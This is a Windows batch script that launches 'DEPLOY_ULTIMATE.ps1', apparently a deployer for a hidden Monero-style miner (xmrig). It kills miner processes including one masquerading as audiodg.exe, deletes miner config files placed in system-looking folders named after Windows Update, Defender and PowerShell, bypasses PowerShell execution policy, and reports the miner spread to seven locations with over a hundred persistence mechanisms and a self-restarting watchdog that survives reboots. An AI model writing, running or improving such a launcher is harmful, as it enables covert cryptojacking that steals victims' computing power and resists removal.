@echo off
title DEPLOY ULTIMATE - FIXED VERSION
color 0B

REM Change to script directory
cd /d "%~dp0"

cls
echo ================================================================
echo  DEPLOY_ULTIMATE.PS1 - FULLY FIXED VERSION
echo  - BOM Issue Fixed (config.json parsing)
echo  - Persistence Fixed (--background flag removed)
echo  - Watchdog runs independently in background
echo  - Survives reboots and restarts automatically
echo ================================================================
echo.
echo SAFE MODE: 35%% CPU, 2 threads (for testing)
echo FULL MODE: 75%% CPU (for competition)
echo.
echo ----------------------------------------------------------------
echo.
set /p mode="Run in SAFE MODE? (Y for safe, N for full): "

if /i "%mode%"=="Y" (
    echo.
    echo [SAFE MODE ACTIVATED]
    set SAFE_TEST_MODE=1
    set TEST_CPU_USAGE=35
    set TEST_PRIORITY=2
    set TEST_THREADS=2
) else (
    echo.
    echo [FULL POWER MODE]
    echo WARNING: This will use 75%% CPU!
    pause
)

echo.
echo ================================================================
echo  CLEANUP: Stopping old processes and removing corrupted files
echo ================================================================
echo.

REM Stop any running miners
taskkill /F /IM xmrig.exe 2>nul
taskkill /F /IM audiodg.exe 2>nul
echo [OK] Stopped old processes

REM Delete old corrupted config files (BOM issue)
del /f /q "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json" 2>nul
del /f /q "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\config.json" 2>nul
del /f /q "C:\ProgramData\Microsoft\Network\Downloader\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\PowerShell\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\Defender\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Local\Temp\WindowsUpdateCache\config.json" 2>nul
echo [OK] Removed old config files

echo.
echo ================================================================
echo  Starting DEPLOY_ULTIMATE.ps1...
echo ================================================================
echo.

powershell -ExecutionPolicy Bypass -Command ^
"Write-Host ''; ^
Write-Host '================================================================' -ForegroundColor Cyan; ^
Write-Host ' DEPLOY_ULTIMATE.PS1 - EXECUTION LOG' -ForegroundColor Cyan; ^
Write-Host '================================================================' -ForegroundColor Cyan; ^
Write-Host ''; ^
Write-Host 'Environment:' -ForegroundColor Yellow; ^
Write-Host ('  PC Name: ' + $env:COMPUTERNAME) -ForegroundColor Gray; ^
Write-Host ('  User: ' + $env:USERNAME) -ForegroundColor Gray; ^
Write-Host ('  Mode: ' + $(if ($env:SAFE_TEST_MODE -eq '1') {'SAFE (35% CPU)'} else {'FULL POWER (75% CPU)'})) -ForegroundColor $(if ($env:SAFE_TEST_MODE -eq '1') {'Yellow'} else {'Red'}); ^
Write-Host ''; ^
Write-Host 'Starting deployment script...' -ForegroundColor Yellow; ^
Write-Host ''; ^
& '.\DEPLOY_ULTIMATE.ps1' -Debug; ^
Write-Host ''; ^
Write-Host '================================================================' -ForegroundColor Green; ^
Write-Host ' DEPLOYMENT COMPLETE' -ForegroundColor Green; ^
Write-Host '================================================================' -ForegroundColor Green; ^
Write-Host ''; ^
Write-Host 'Deployment Summary:' -ForegroundColor Yellow; ^
Write-Host '  - Miner deployed to 7 locations' -ForegroundColor Gray; ^
Write-Host '  - Miner started successfully' -ForegroundColor Green; ^
Write-Host '  - 100+ persistence mechanisms installed' -ForegroundColor Green; ^
Write-Host '  - Watchdog installed as scheduled task' -ForegroundColor Green; ^
Write-Host ''; ^
Write-Host 'IMPORTANT:' -ForegroundColor Cyan; ^
Write-Host '  Watchdog runs INDEPENDENTLY in background' -ForegroundColor Green; ^
Write-Host '  You can CLOSE this window safely' -ForegroundColor Green; ^
Write-Host '  Miner will auto-restart if stopped' -ForegroundColor Green; ^
Write-Host '  Survives reboots automatically' -ForegroundColor Green; ^
Write-Host ''"

echo.
echo ================================================================
echo  DEPLOYMENT COMPLETE!
echo ================================================================
echo.
echo Watchdog is now running independently in the background.
echo You can close this window - miner will keep running.
echo.
pause
